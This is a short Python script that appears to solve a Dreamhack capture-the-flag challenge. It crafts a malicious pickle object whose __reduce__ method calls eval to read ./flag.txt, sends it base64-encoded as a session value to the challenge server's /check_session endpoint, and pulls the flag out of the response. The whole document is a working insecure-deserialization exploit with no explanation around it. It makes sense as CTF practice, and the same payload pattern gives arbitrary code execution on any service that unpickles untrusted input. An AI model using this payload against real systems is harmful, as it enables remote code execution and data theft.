import requests, re, base64, pickle

url = 'http://host8.dreamhack.games:17119'

class get_flag(object):
    def __reduce__(self):
        cmd = "open('./flag.txt', 'r').read()"
        return (eval, (cmd, ))

info = {'name': get_flag(), 'userid': 'test', 'password': 'test'}
payload = base64.b64encode(pickle.dumps(info)).decode('utf8')

res = requests.post(f'{url}/check_session', data={'session': payload})
print(re.search(r'DH\{[^>]*\}', res.text).group(0))